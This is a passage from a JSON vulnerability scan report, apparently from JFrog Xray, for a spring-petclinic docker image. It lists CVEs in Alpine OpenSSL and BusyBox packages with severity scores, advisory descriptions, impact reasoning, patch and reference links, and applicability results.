               "< 1.1.1n-r0"
            ],
            "fixed_versions": [
               "1.1.1n-r0"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-0778",
                     "cwe": [
                        "CWE-835"
                     ],
                     "cwe_details": {
                        "CWE-835": {
                           "name": "Loop with Unreachable Exit Condition ('Infinite Loop')",
                           "description": "The product contains an iteration or loop with an exit condition that cannot be reached, i.e., an infinite loop."
                        }
                     },
                     "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:N/I:N/A:P",
                     "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "The BN_mod_sqrt() function, which computes a modular square root, contains a bug that can cause it to loop forever for non-prime moduli. Internally this function is used when parsing certificates that contain elliptic curve public keys in compressed form or explicit elliptic curve parameters with a base point encoded in compressed form. It is possible to trigger the infinite loop by crafting a certificate that has invalid explicit curve parameters. Since certificate parsing happens prior to verification of the certificate signature, any process that parses an externally supplied certificate may thus be subject to a denial of service attack. The infinite loop can also be reached when parsing crafted private keys as they can contain explicit elliptic curve parameters. Thus vulnerable situations include: - TLS clients consuming server certificates - TLS servers consuming client certificates - Hosting providers taking certificates or private keys from customers - Certificate authorities parsing certification requests from subscribers - Anything else which parses ASN.1 elliptic curve parameters Also any other applications that use the BN_mod_sqrt() where the attacker can control the parameter values are vulnerable to this DoS issue. In the OpenSSL 1.0.2 version the public key is not parsed during initial parsing of the certificate which makes it slightly harder to trigger the infinite loop. However any operation which requires the public key from the certificate will trigger the infinite loop. In particular the attacker can use a self-signed certificate to trigger the loop during verification of the certificate signature. This issue affects OpenSSL versions 1.0.2, 1.1.1 and 3.0. It was addressed in the releases of 1.1.1n and 3.0.2 on the 15th March 2022. Fixed in OpenSSL 3.0.2 (Affected 3.0.0,3.0.1). Fixed in OpenSSL 1.1.1n (Affected 1.1.1-1.1.1m). Fixed in OpenSSL 1.0.2zd (Affected 1.0.2-1.0.2zc).",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:27:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-200048",
            "VulnerabilityTitle": "",
            "ShortDescription": "Infinite loop in OpenSSL leads to denial of service when parsing a malformed certificate.",
            "FullDescription": "A flaw was discovered in OpenSSL's `BN_mod_sqrt` function, when handling a non-prime modulus (`p`) - an incomplete loop condition can cause the function to loop indefinitely, causing a denial of service.\n\nIt is possible to create a malformed X.509 certificate, containing elliptic curve parameters that trigger this issue, when the certificate is parsed.\nA malformed certificate may be parsed under various conditions - \n1. TLS clients consuming server certificates - ex. a victim browser surfing to a malicious HTTPS website\n2. TLS servers consuming client certificates - ex. a victim HTTPS server that accepts client certificates, attacked by a malicious HTTPS client (note that most web servers, including Apache and NGINX, do not accept client certificates by default)\n\nNote that unlike the original advisory suggests, all OpenSSL versions since 0.9.7 are vulnerable to this issue",
            "Impact": 5,
            "VulnerabilityType": "Denial of service",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue can be exploited by an unauthenticated attacker or an attacker with low privileges",
                  "Description": "X.509 certificates must be parsed before they can be validated, so an unauthenticated attack is highly likely",
                  "IsPositive": 0,
                  "InsertOrder": 4
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The vulnerable service must somehow parse an X.509 certificate",
                  "IsPositive": 1,
                  "InsertOrder": 5
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are either extremely common or nonexistent (always exploitable)",
                  "Description": "A vast amount of services parse X.509 certificates using OpenSSL",
                  "IsPositive": 0,
                  "InsertOrder": 6
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue can be exploited by attackers over the network",
                  "Description": "In many cases, including the case of web servers that accept client certificates - unauthenticated remote attack is possible. Other cases are context-dependent.",
                  "IsPositive": 0,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has multiple mentions in general media",
                  "Description": "",
                  "IsPositive": 0,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has an exploit published",
                  "Description": "The exploit performs a local test and allows generating a malicious certificate for remote attacks",
                  "IsPositive": 0,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue cannot result in a severe impact (such as remote code execution)",
                  "Description": "Denial of service only. Since most web clients and servers employ multiprocessing, causing one process to get stuck in an infinite loop will not DoS the entire application. Furthermore - `openssl` is often run as a standalone (forked) process, which will have no effect if stuck in an infinite loop.",
                  "IsPositive": 1,
                  "InsertOrder": 7
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Exploit",
                  "Title": "Technical writeup + PoC exploit (local test + malicious certificate generation)",
                  "Url": "https://github.com/drago-96/CVE-2022-0778",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Exploit",
                  "Title": "Vendor test contains a testcase with parameters for generating a malicious certificate",
                  "Url": "https://github.com/openssl/openssl/commit/3ef5c3034e5c545f34d6929568f3f2b10ac4bdf0",
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Vendor patch",
                  "Url": "https://github.com/openssl/openssl/commit/3118eb64934499d93db3230748a452351d1d9a65",
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "Original advisory",
                  "Url": "https://www.openssl.org/news/secadv/20220315.txt",
                  "InsertOrder": 4
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2022-0778",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-203005",
         "severity": "High",
         "jfrog_severity": "Low",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "BusyBox through 1.35.0 allows remote attackers to execute arbitrary code if netstat is used to print a DNS PTR record's value to a VT compatible terminal. Alternatively, the attacker could choose to change the terminal's colors.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:ssl_client",
         "source_id": "alpine://3.14:ssl_client",
         "source_comp_id": "alpine://3.14:busybox:1.33.1-r2",
         "component_versions": {
            "id": "3.14:ssl_client",
            "vulnerable_versions": [
               "< 1.33.1-r7"
            ],
            "fixed_versions": [
               "1.33.1-r7"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-28391",
                     "cwe": [
                        "NVD-CWE-noinfo"
                     ],
                     "cvss_v2": "6.8/CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:P/A:P",
                     "cvss_v3": "8.8/CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"
                  }
               ],
               "description": "BusyBox through 1.35.0 allows remote attackers to execute arbitrary code if netstat is used to print a DNS PTR record's value to a VT compatible terminal. Alternatively, the attacker could choose to change the terminal's colors.",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:25:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-203005",
            "VulnerabilityTitle": "",
            "ShortDescription": "Escape sequence injection in BusyBox's netstat results in unspecified impact (code execution if using some extreme-legacy terminal emulators).",
            "FullDescription": "`netstat` is a command line utility that displays active TCP connections, recent UDP transmissions, and listening sockets.\n\nIn [BusyBox](https://busybox.net/)'s `netstat` implementation, a vulnerability exists in which DNS PTR record values are not sanitized for escape characters before printing. This issue affects Virtual Terminal emulators, in which special escape characters may be used to command the terminal, and may even result in code execution, although there is no available exploit demonstrating this. The lack of RCE PoC code is due to the fact that no modern terminal emulator allows code execution via escape characters.\n\nTo exploit this vulnerability, an attacker must be able to carry out a DNS poisoning attack, so that a query from a vulnerable machine is answered with a malicious response (i.e. when trying to connect to a certain host), containing Virtual Terminal escape characters. Additionally, `netstat` must be executed at the same time from a VT emulator, so that the DNS response containing the malicious hostname is printed and interpreted by the VT as an escaped command.",
            "Impact": 4,
            "VulnerabilityType": "Unspecified",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue can be exploited by attackers over the network",
                  "Description": "The vulnerability is triggered over DNS",
                  "IsPositive": 0,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has an exploit published",
                  "Description": "Publish exploit demonstrates an attack with a payload that changes terminal colors",
                  "IsPositive": 0,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The reported CVSS was either wrongly calculated, downgraded by other vendors, or does not reflect the vulnerability's impact",
                  "Description": "The Attack Complexity for this vulnerability is \"Low\", but should be \"High\". Moreover, \"Confidentiality\" is \"High\", but exploitation impact is context-dependent and cannot be presumed",
                  "IsPositive": 1,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "Exploitation depends on the target system using (i.e. automatically calling, or by user interaction) `netstat` from a VT emulator after trying to connect to a spoofed host. No modern terminal emulator allows code execution via escape characters.",
                  "IsPositive": 1,
                  "InsertOrder": 4
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue cannot result in a severe impact (such as remote code execution)",
                  "Description": "No modern terminal emulator allows code execution via escape characters",
                  "IsPositive": 1,
                  "InsertOrder": 5
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Exploit",
                  "Title": "Exploit & Advisory",
                  "Url": "https://gitlab.alpinelinux.org/alpine/aports/-/issues/13661",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Alpine Linux upstream patch #2",
                  "Url": "https://git.alpinelinux.org/aports/plain/main/busybox/0002-nslookup-sanitize-all-printed-strings-with-printable.patch",
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Alpine Linux upstream patch #1",
                  "Url": "https://git.alpinelinux.org/aports/plain/main/busybox/0001-libbb-sockaddr2str-ensure-only-printable-characters-.patch",
                  "InsertOrder": 3
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:busybox:1.33.1-r2",
            "cve_id": "CVE-2022-28391",
            "scan_status": 1,
            "applicability": null,
            "evidence": null,
            "info": "Applicability cannot be determined since exploitation depends on user interaction. Specifically - the user must run the \"netstat\" CLI tool at exactly the same time that a DNS poisoning attack is made.",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:busybox:1.33.1-r2",
            "vulnerability_id": "CVE-2022-28391",
            "result": "undetermined"
         }
      },
      {
         "id": "XRAY-203005",
         "severity": "High",
         "jfrog_severity": "Low",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "BusyBox through 1.35.0 allows remote attackers to execute arbitrary code if netstat is used to print a DNS PTR record's value to a VT compatible terminal. Alternatively, the attacker could choose to change the terminal's colors.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:busybox",
         "source_id": "alpine://3.14:busybox",
         "source_comp_id": "alpine://3.14:busybox:1.33.1-r2",
         "component_versions": {
            "id": "3.14:busybox",
            "vulnerable_versions": [
               "< 1.33.1-r7"
            ],
            "fixed_versions": [
               "1.33.1-r7"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-28391",
                     "cwe": [
                        "NVD-CWE-noinfo"
                     ],
                     "cvss_v2": "6.8/CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:P/A:P",
                     "cvss_v3": "8.8/CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"
                  }
               ],
               "description": "BusyBox through 1.35.0 allows remote attackers to execute arbitrary code if netstat is used to print a DNS PTR record's value to a VT compatible terminal. Alternatively, the attacker could choose to change the terminal's colors.",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:25:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-203005",
            "VulnerabilityTitle": "",
            "ShortDescription": "Escape sequence injection in BusyBox's netstat results in unspecified impact (code execution if using some extreme-legacy terminal emulators).",
            "FullDescription": "`netstat` is a command line utility that displays active TCP connections, recent UDP transmissions, and listening sockets.\n\nIn [BusyBox](https://busybox.net/)'s `netstat` implementation, a vulnerability exists in which DNS PTR record values are not sanitized for escape characters before printing. This issue affects Virtual Terminal emulators, in which special escape characters may be used to command the terminal, and may even result in code execution, although there is no available exploit demonstrating this. The lack of RCE PoC code is due to the fact that no modern terminal emulator allows code execution via escape characters.\n\nTo exploit this vulnerability, an attacker must be able to carry out a DNS poisoning attack, so that a query from a vulnerable machine is answered with a malicious response (i.e. when trying to connect to a certain host), containing Virtual Terminal escape characters. Additionally, `netstat` must be executed at the same time from a VT emulator, so that the DNS response containing the malicious hostname is printed and interpreted by the VT as an escaped command.",
            "Impact": 4,
            "VulnerabilityType": "Unspecified",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue can be exploited by attackers over the network",
                  "Description": "The vulnerability is triggered over DNS",
                  "IsPositive": 0,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has an exploit published",
                  "Description": "Publish exploit demonstrates an attack with a payload that changes terminal colors",
                  "IsPositive": 0,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The reported CVSS was either wrongly calculated, downgraded by other vendors, or does not reflect the vulnerability's impact",
                  "Description": "The Attack Complexity for this vulnerability is \"Low\", but should be \"High\". Moreover, \"Confidentiality\" is \"High\", but exploitation impact is context-dependent and cannot be presumed",
                  "IsPositive": 1,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "Exploitation depends on the target system using (i.e. automatically calling, or by user interaction) `netstat` from a VT emulator after trying to connect to a spoofed host. No modern terminal emulator allows code execution via escape characters.",
                  "IsPositive": 1,
                  "InsertOrder": 4
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue cannot result in a severe impact (such as remote code execution)",
                  "Description": "No modern terminal emulator allows code execution via escape characters",
                  "IsPositive": 1,
                  "InsertOrder": 5
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Exploit",
                  "Title": "Exploit & Advisory",
                  "Url": "https://gitlab.alpinelinux.org/alpine/aports/-/issues/13661",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Alpine Linux upstream patch #2",
                  "Url": "https://git.alpinelinux.org/aports/plain/main/busybox/0002-nslookup-sanitize-all-printed-strings-with-printable.patch",
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Alpine Linux upstream patch #1",
                  "Url": "https://git.alpinelinux.org/aports/plain/main/busybox/0001-libbb-sockaddr2str-ensure-only-printable-characters-.patch",
                  "InsertOrder": 3
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:busybox:1.33.1-r2",
            "cve_id": "CVE-2022-28391",
            "scan_status": 1,
            "applicability": null,
            "evidence": null,
            "info": "Applicability cannot be determined since exploitation depends on user interaction. Specifically - the user must run the \"netstat\" CLI tool at exactly the same time that a DNS poisoning attack is made.",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:busybox:1.33.1-r2",
            "vulnerability_id": "CVE-2022-28391",
            "result": "undetermined"
         }
      },
      {
         "id": "XRAY-523654",
         "severity": "High",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "crypto/rsa/rsa_gen.c in OpenSSL before 0.9.6 mishandles C bitwise-shift operations that exceed the size of an expression, which makes it easier for remote attackers to defeat cryptographic protection mechanisms by leveraging improper RSA key generation on 64-bit HP-UX platforms.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libcrypto1.1",
         "source_id": "alpine://3.14:libcrypto1.1",
         "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libcrypto1.1",
            "vulnerable_versions": [
               "≤ 1.1.1t-r2"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2000-1254",
                     "cwe": [
                        "CWE-310"
                     ],
                     "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:P/I:N/A:N",
                     "cvss_v3": "7.5/CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
                  }
               ],
               "description": "crypto/rsa/rsa_gen.c in OpenSSL before 0.9.6 mishandles C bitwise-shift operations that exceed the size of an expression, which makes it easier for remote attackers to defeat cryptographic protection mechanisms by leveraging improper RSA key generation on 64-bit HP-UX platforms.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2000-1254",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-523654",
         "severity": "High",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "crypto/rsa/rsa_gen.c in OpenSSL before 0.9.6 mishandles C bitwise-shift operations that exceed the size of an expression, which makes it easier for remote attackers to defeat cryptographic protection mechanisms by leveraging improper RSA key generation on 64-bit HP-UX platforms.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libssl1.1",
         "source_id": "alpine://3.14:libssl1.1",
         "source_comp_id": "alpine://3.14:libssl1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libssl1.1",
            "vulnerable_versions": [
               "≤ 1.1.1t-r2"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2000-1254",
                     "cwe": [
                        "CWE-310"
                     ],
                     "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:P/I:N/A:N",
                     "cvss_v3": "7.5/CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
                  }
               ],
               "description": "crypto/rsa/rsa_gen.c in OpenSSL before 0.9.6 mishandles C bitwise-shift operations that exceed the size of an expression, which makes it easier for remote attackers to defeat cryptographic protection mechanisms by leveraging improper RSA key generation on 64-bit HP-UX platforms.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2000-1254",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-190234",
         "severity": "Medium",
         "jfrog_severity": "High",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "An out-of-bounds heap read in Busybox's unlzma applet leads to information leak and denial of service when crafted LZMA-compressed input is decompressed. This can be triggered by any applet/format that",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:busybox",
         "source_id": "alpine://3.14:busybox",
         "source_comp_id": "alpine://3.14:busybox:1.33.1-r2",
         "component_versions": {
            "id": "3.14:busybox",
            "vulnerable_versions": [
               "< 1.33.1-r4"
            ],
            "fixed_versions": [
               "1.33.1-r4"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2021-42374",
                     "cwe": [
                        "CWE-125"
                     ],
                     "cwe_details": {
                        "CWE-125": {
                           "name": "Out-of-bounds Read",
                           "description": "The product reads data past the end, or before the beginning, of the intended buffer.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "7"
                              }
                           ]
                        }
                     },
                     "cvss_v2": "3.3/CVSS:2.0/AV:L/AC:M/Au:N/C:P/I:N/A:P",
                     "cvss_v3": "5.3/CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:H"
                  }
               ],
               "description": "An out-of-bounds heap read in Busybox's unlzma applet leads to information leak and denial of service when crafted LZMA-compressed input is decompressed. This can be triggered by any applet/format that",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:27:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-190234",
            "VulnerabilityTitle": "",
            "ShortDescription": "A OOB heap read in Busybox lzma leads to data leakage and denial of service when decompressing a malformed LZMA-based archive.",
            "FullDescription": "The [BusyBox](https://busybox.net/) toolkit implements a large number of Linux tools in a single executable and can even replace the Linux init system. Its small size and flexibility make it popular in embedded devices.\n\nAn out-of-bounds heap read in `unlzma` leads to information leak and denial of service when crafted LZMA-compressed input is decompressed. This can be triggered by any applet/format that internally supports LZMA compression.\nAn attacker that can pass an LZMA-based archive to be decompressed, can cause data leakage and denial of service.\nNote that the following applets all accept and decompress an LZMA-based archive:\n`unlzma`, `tar`, `unzip`, `rpm`, `dpkg`, `man`\n\nAs shown in the [JFrog blogpost](https://jfrog.com/blog/unboxing-busybox-14-new-vulnerabilities-uncovered-by-claroty-and-jfrog/), the attack is most potent when the victim unzips a crafted zip archive, since there are no special requirements on the unzipped filename and the leaked data can be archived back into the original zip archive.",
            "Impact": 6,
            "VulnerabilityType": "Data leakage",
            "Resolution": "##### Development mitigations\n\nComment out `CONFIG_UNLZMA=y`, `CONFIG_FEATURE_SEAMLESS_LZMA=y` and `CONFIG_FEATURE_UNZIP_LZMA=y` in Busybox's `.config` file and recompile",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has a detailed technical explanation published, that can aid in exploit development",
                  "Description": "",
                  "IsPositive": 0,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The attacker would need to determine which external input propagates into the applet's command line arguments",
                  "IsPositive": 1,
                  "InsertOrder": 2
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "JFrog blogpost",
                  "Url": "https://jfrog.com/blog/unboxing-busybox-14-new-vulnerabilities-uncovered-by-claroty-and-jfrog/",
                  "InsertOrder": 1
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2021-42374",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-190234",
         "severity": "Medium",
         "jfrog_severity": "High",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "An out-of-bounds heap read in Busybox's unlzma applet leads to information leak and denial of service when crafted LZMA-compressed input is decompressed. This can be triggered by any applet/format that",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:ssl_client",
         "source_id": "alpine://3.14:ssl_client",
         "source_comp_id": "alpine://3.14:ssl_client:1.33.1-r2",
         "component_versions": {
            "id": "3.14:ssl_client",
            "vulnerable_versions": [
               "< 1.33.1-r4"
            ],
            "fixed_versions": [
               "1.33.1-r4"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2021-42374",
                     "cwe": [
                        "CWE-125"
                     ],
                     "cwe_details": {
                        "CWE-125": {
                           "name": "Out-of-bounds Read",
                           "description": "The product reads data past the end, or before the beginning, of the intended buffer.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "7"
                              }
                           ]
                        }
                     },
                     "cvss_v2": "3.3/CVSS:2.0/AV:L/AC:M/Au:N/C:P/I:N/A:P",
                     "cvss_v3": "5.3/CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:H"
                  }
               ],
               "description": "An out-of-bounds heap read in Busybox's unlzma applet leads to information leak and denial of service when crafted LZMA-compressed input is decompressed. This can be triggered by any applet/format that",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:27:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-190234",
            "VulnerabilityTitle": "",
            "ShortDescription": "A OOB heap read in Busybox lzma leads to data leakage and denial of service when decompressing a malformed LZMA-based archive.",
            "FullDescription": "The [BusyBox](https://busybox.net/) toolkit implements a large number of Linux tools in a single executable and can even replace the Linux init system. Its small size and flexibility make it popular in embedded devices.\n\nAn out-of-bounds heap read in `unlzma` leads to information leak and denial of service when crafted LZMA-compressed input is decompressed. This can be triggered by any applet/format that internally supports LZMA compression.\nAn attacker that can pass an LZMA-based archive to be decompressed, can cause data leakage and denial of service.\nNote that the following applets all accept and decompress an LZMA-based archive:\n`unlzma`, `tar`, `unzip`, `rpm`, `dpkg`, `man`\n\nAs shown in the [JFrog blogpost](https://jfrog.com/blog/unboxing-busybox-14-new-vulnerabilities-uncovered-by-claroty-and-jfrog/), the attack is most potent when the victim unzips a crafted zip archive, since there are no special requirements on the unzipped filename and the leaked data can be archived back into the original zip archive.",
            "Impact": 6,
            "VulnerabilityType": "Data leakage",
            "Resolution": "##### Development mitigations\n\nComment out `CONFIG_UNLZMA=y`, `CONFIG_FEATURE_SEAMLESS_LZMA=y` and `CONFIG_FEATURE_UNZIP_LZMA=y` in Busybox's `.config` file and recompile",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has a detailed technical explanation published, that can aid in exploit development",
                  "Description": "",
                  "IsPositive": 0,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The attacker would need to determine which external input propagates into the applet's command line arguments",
                  "IsPositive": 1,
                  "InsertOrder": 2
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "JFrog blogpost",
                  "Url": "https://jfrog.com/blog/unboxing-busybox-14-new-vulnerabilities-uncovered-by-claroty-and-jfrog/",
                  "InsertOrder": 1
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2021-42374",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-539895",
         "severity": "Medium",
         "jfrog_severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "A use-after-free vulnerability was discovered in BusyBox v.1.36.1 via a crafted awk pattern in the awk.c copyvar function.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:busybox",
         "source_id": "alpine://3.14:busybox",
         "source_comp_id": "alpine://3.14:busybox:1.33.1-r2",
         "component_versions": {
            "id": "3.14:busybox",
            "vulnerable_versions": [
               "< 1.36.1-r30"
            ],
            "fixed_versions": [
               "1.36.1-r30"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-42365",
                     "cwe": [
                        "CWE-416"
                     ],
                     "cwe_details": {
                        "CWE-416": {
                           "name": "Use After Free",
                           "description": "Referencing memory after it has been freed can cause a program to crash, use unexpected values, or execute code.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "4"
                              }
                           ]
                        }
                     },
                     "cvss_v3": "5.5/CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "A use-after-free vulnerability was discovered in BusyBox v.1.36.1 via a crafted awk pattern in the awk.c copyvar function.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
